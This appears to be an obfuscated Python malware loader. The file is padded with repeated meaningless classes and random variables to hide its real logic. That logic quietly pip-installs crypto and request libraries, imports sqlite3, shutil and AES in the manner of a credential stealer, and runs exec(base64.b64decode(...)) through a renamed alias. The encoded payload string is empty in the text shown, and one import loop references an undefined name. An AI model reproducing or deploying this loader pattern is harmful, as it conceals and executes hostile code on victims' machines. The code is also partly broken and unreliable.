

from sys import executable, stderr
'HrmZiZ306U'
class tk89Cmbi1o:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class z5xtybEmfE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'fG7BCVq', 'age': 23}
class UE6GfJwemV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
kmhJd5w4wP = 88747697
class o2aGdLEIap:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vqaUAz6A3P = 89320464
JrHf4BAKNs = 38104833
class csALlzHllF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class n3T0CUefSp:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
GDB7rvY3ZN = 50742141
R8PozpdsHd = 63239189
e0iDRXVZf8 = 51121470
class ThwkmN60Wf:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class FwP3Zt46qI:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class O3jJbwZOP8:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'TfSEp2wkFz'", "'XFfIba7Eeu'", "'miMpTc9ObG'", "'JvrGYMej43'"]
RVUPCTFxTF = 65062434
TQrm5aTH5W = 33521922
pAIkjtbmw2 = 21705658
class J13x5k48j1:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
WhR3kc6O8I = 47871763
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
'HrmZiZ306U'
class tk89Cmbi1o:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class z5xtybEmfE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'fG7BCVq', 'age': 23}
class UE6GfJwemV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
kmhJd5w4wP = 88747697
class o2aGdLEIap:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vqaUAz6A3P = 89320464
JrHf4BAKNs = 38104833
class csALlzHllF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class n3T0CUefSp:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
GDB7rvY3ZN = 50742141
R8PozpdsHd = 63239189
e0iDRXVZf8 = 51121470
class ThwkmN60Wf:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class FwP3Zt46qI:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class O3jJbwZOP8:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'TfSEp2wkFz'", "'XFfIba7Eeu'", "'miMpTc9ObG'", "'JvrGYMej43'"]
RVUPCTFxTF = 65062434
TQrm5aTH5W = 33521922
pAIkjtbmw2 = 21705658
class J13x5k48j1:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
WhR3kc6O8I = 47871763
m7Wve8HosoQnAPdNHsBXT7FPhaXgaQNzPacmSw = exec
'HrmZiZ306U'
class tk89Cmbi1o:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class z5xtybEmfE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'fG7BCVq', 'age': 23}
class UE6GfJwemV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
kmhJd5w4wP = 88747697
class o2aGdLEIap:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vqaUAz6A3P = 89320464
JrHf4BAKNs = 38104833
class csALlzHllF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class n3T0CUefSp:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
GDB7rvY3ZN = 50742141
R8PozpdsHd = 63239189
e0iDRXVZf8 = 51121470
class ThwkmN60Wf:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class FwP3Zt46qI:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class O3jJbwZOP8:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'TfSEp2wkFz'", "'XFfIba7Eeu'", "'miMpTc9ObG'", "'JvrGYMej43'"]
RVUPCTFxTF = 65062434
TQrm5aTH5W = 33521922
pAIkjtbmw2 = 21705658
class J13x5k48j1:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
WhR3kc6O8I = 47871763
import concurrent.futures
XeV2teqokupTLBBTsGGwY5DbvTj6a6fjKpDTm0=""
m7Wve8HosoQnAPdNHsBXT7FPhaXgaQNzPacmSw(base64.b64decode(XeV2teqokupTLBBTsGGwY5DbvTj6a6fjKpDTm0))
'HrmZiZ306U'
class tk89Cmbi1o:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class z5xtybEmfE:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'fG7BCVq', 'age': 23}
class UE6GfJwemV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
kmhJd5w4wP = 88747697
class o2aGdLEIap:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
vqaUAz6A3P = 89320464
JrHf4BAKNs = 38104833
class csALlzHllF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class n3T0CUefSp:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
GDB7rvY3ZN = 50742141
R8PozpdsHd = 63239189
e0iDRXVZf8 = 51121470
class ThwkmN60Wf:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class FwP3Zt46qI:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class O3jJbwZOP8:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'TfSEp2wkFz'", "'XFfIba7Eeu'", "'miMpTc9ObG'", "'JvrGYMej43'"]
RVUPCTFxTF = 65062434
TQrm5aTH5W = 33521922
pAIkjtbmw2 = 21705658
class J13x5k48j1:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
WhR3kc6O8I = 47871763